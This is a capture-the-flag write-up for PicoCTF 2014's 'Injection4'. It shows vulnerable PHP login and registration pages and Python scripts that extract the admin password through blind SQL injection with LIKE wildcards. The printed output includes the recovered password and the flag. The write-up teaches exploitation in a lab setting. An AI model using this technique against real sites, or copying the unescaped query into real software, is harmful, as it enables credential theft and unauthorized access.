### Injection4

This challenge comes from PicoCTF 2014. This is a good example to show "when sql injection is possible" and how to exploit it according to the requirement.
We hav two PHP web pages, ```login.phps``` and ```register.phps```. The following are their source codes respectively:
```
 <?php
include "config.php";
$con = mysqli_connect("localhost", "sql4", "sql4", "sql4");
$username = mysqli_real_escape_string($con, $_POST["username"]);
$password = mysqli_real_escape_string($con, $_POST["password"]);
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) === 1) {
  $row = mysqli_fetch_array($result);
  echo "<h1>Logged in!</h1>";
  echo "<p>Your flag is: $FLAG</p>";
} else {
  echo "<h1>Login failed.</h1>";
}
?> 
```

```
 <?php
include "config.php";
$con = mysqli_connect("localhost", "sql4", "sql4", "sql4");
$username = $_POST["username"];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 0) {
  die("Someone has already registered " . htmlspecialchars($username));
}

die("Registration has been disabled.");
?> 
```
```login.phps``` seems very secure: the user inputs are escaped as well as enclosed in quotation ```'```. On the other hand, on ```register.phps```,
```$username``` is NOT escaped. 
Since the flag is on ```register.phps```, what we have to do is clear: find a set of username and password registered in the table ```users```.

For the username, it is actually a guess. A likely username is ```admin```, when we ```POST``` it to ```register.phps```, it returns ```Someone has already registered admin```.
So now we find the password of admin!

This is where bruteforcing comes in. As we have used previously, there is an option for SQL queries called ```LIKE```. We can append an ```AND``` clause followed by ```password LIKE ``` so that only when we match both the username and password,
```register.phps``` returns ```Someone has already registered admin```. For the use of the special characters ```_``` and ```%```, refer to the previous injeciton writeup.

Then it's the matter of writing the script. This time we make ```POST``` request. 

What is reasonable to do is to first find the length of the password, so that we know when to stop. The following is a snippet that does exactly that.
```
h = HTMLParser()
begin = 'admin\' AND password LIKE \"'

##identify the length 
count = 1
while True:
    query = begin + '_'*count + "\"" + '-- '
    payload = {'username': query}
    resp = requests.post(url,data=payload)
    print 'count = ' + str(count) + ' :' + h.unescape(resp.text)
    if("Someone has already registered admin" in resp.text):
        print 'The length of the password is = ' + str(count)
        break
    count = count + 1
```
Recall that one ```_``` matches one character in the password. So whenever the number of ```_``` matches the length of the password, the SQL query succeeds!
The output seems as follows:
```
...

count = 24 :Registration has been disabled.
count = 25 :Registration has been disabled.
count = 26 :Registration has been disabled.
count = 27 :Someone has already registered admin' AND password LIKE "___________________________"--
The length of the password is = 27
```
So the length of the password is 27!

Now we can proceed to the next step, which is bruteforce the exact password. The concept is very simple: given a set of possible characters, just try out every combination! What makes it easy however is the ```%``` character. Since it matches to ANY string, we can reduce the search space
character by character! See the code below:
```
confirmed = ''
for char in itertools.cycle(passchars):
    query = begin + confirmed + char + '%' + "\"" + '-- '
    payload = {'username': query}
    resp = requests.post(url,data=payload)
    
    if("Someone has already registered admin" in resp.text):
        confirmed += char
        print h.unescape(resp.text)
        if len(confirmed) == 27:
            print 'password = ' + confirmed
            break
```
And the output is this (note that it takes about 10 min to brute force):
```
Someone has already registered admin' AND password LIKE "y%"--
Someone has already registered admin' AND password LIKE "yo%"--
Someone has already registered admin' AND password LIKE "you%"--
Someone has already registered admin' AND password LIKE "youl%"--
Someone has already registered admin' AND password LIKE "youll%"--
Someone has already registered admin' AND password LIKE "youlln%"--
Someone has already registered admin' AND password LIKE "youllne%"--
Someone has already registered admin' AND password LIKE "youllnev%"--

...

Someone has already registered admin' AND password LIKE "youllneverguessthispassw%"--
Someone has already registered admin' AND password LIKE "youllneverguessthispasswo%"--
Someone has already registered admin' AND password LIKE "youllneverguessthispasswor%"--
Someone has already registered admin' AND password LIKE "youllneverguessthispassword%"--
password = youllneverguessthispassword
```
Indeed, the password is 27-characters long! If we log in as ```admin``` using ```password = youllneverguessthispassword```, we get the flag.
```
Logged in!

Your flag is: whereof_one_cannot_speak_thereof_one_must_be_silent
```

